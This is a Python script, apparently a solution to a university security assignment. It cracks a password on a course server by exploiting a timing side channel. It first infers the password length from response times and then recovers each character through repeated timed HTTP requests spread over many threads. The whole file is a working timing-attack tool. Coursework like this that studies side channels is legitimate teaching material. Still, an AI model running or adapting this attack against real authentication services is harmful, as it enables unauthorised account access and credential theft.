import http.client
import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor
from ThreadSafeCounter import ThreadSafeTimeTracker
from decimal import Decimal, getcontext

### --- Global Variables --- ###

DIFFICULTY = 1

BASE_URL = "aoi-assignment1.oy.ne.ro"
SERVER_PORT = 8080

CHARSET = "abcdefghijklmnopqrstuvwxyz"

USERNAME = "326529229" # need to recieve

NUMBER_OF_THREADS = 13

PASSWORD = ""
LENGTH = -1

getcontext().prec = 30

### ------------------------- ###

def split_charset():
    """
    this function splits the charset into NUMBER_OF_THREADS parts
    """
    global CHARSET, NUMBER_OF_THREADS
    per_thread = len(CHARSET) // NUMBER_OF_THREADS
    if(len(CHARSET) % NUMBER_OF_THREADS != 0):
        per_thread += 1
    parts = [CHARSET[i:i+per_thread] for i in range(0, len(CHARSET), per_thread)]
    return parts

### ------------------------- ###

def try_pass(password):
    """
    this function sends an auth request to the server with the given password
    returns a dictionairy structured as follows:
    {
        "Status": <status_code>,
        "Reason": <reason>,
        "Time": <time taken to receive the response>,
        "Data": <response data (single Byte) from the server>
    }
    """
    global USERNAME, DIFFICULTY
    # Handle Request Parameters
    params = {'user': USERNAME, 'password': password, 'difficulty': DIFFICULTY}
    query_string = urllib.parse.urlencode(params)
    # Create the connection
    conn = http.client.HTTPConnection(BASE_URL, SERVER_PORT)
    # Append the query string to the URL path
    path = f"/?{query_string}"
    start = time.perf_counter_ns()
    conn.request("GET", path)
    response = conn.getresponse()
    delta = Decimal(time.perf_counter_ns()) - Decimal(start)

    data = response.read()
    conn.close()
    return {"Status": response.status, "Reason": response.reason, "Time": delta, "Data": data}


### ------------------------- ###


def crack_password_length():
    # to warm up the connection
    try_pass("!")
    maxTime = 0
    length=-1
    for l in range(33):
        result = try_pass("a" * l)
        if(result.get("Time") > maxTime):
            maxTime = result.get("Time")
            length=l
    return length


### ------------------------- ###

def num_repetitions(discovered_length):
    """
    this function returns the number of repetitions needed for each char
    """
    global LENGTH
    return int(discovered_length/2) + 2


def crack_next_char(discovered_length, executor):
    global NUMBER_OF_THREADS
    counter = ThreadSafeTimeTracker()
    parts = split_charset()
    for i in range(num_repetitions(discovered_length)):
        futures = []
        for part in parts:
            futures.append(executor.submit(worker, part, discovered_length, counter))
        # Wait for all threads to complete
        for future in futures:
            future.result()
    return counter.get_max_letter()
    


def worker(chars, discovered_length, counter):
    global PASSWORD, LENGTH
    # to warm up the connection
    try_pass("!")
    for char in chars:
        result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
        counter.record_time(char, result.get("Time"))


### ------------------------- ###

def main():
    global PASSWORD, LENGTH
    start = time.process_time()
    # first step - exploit the server's length validation
    LENGTH = crack_password_length()
    print(f"Password length: {LENGTH}")
    # second step - crack the password char by char
    discovered_length = 0
    with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
        while len(PASSWORD) < LENGTH:
            PASSWORD += crack_next_char(discovered_length, executor)
            discovered_length += 1
            print(f"Password so far: {PASSWORD}")
    end = time.process_time()
    print("-------------------")
    print(try_pass(PASSWORD))
    print(f"total time took: {end-start}")
        

if __name__ == '__main__':
    main()
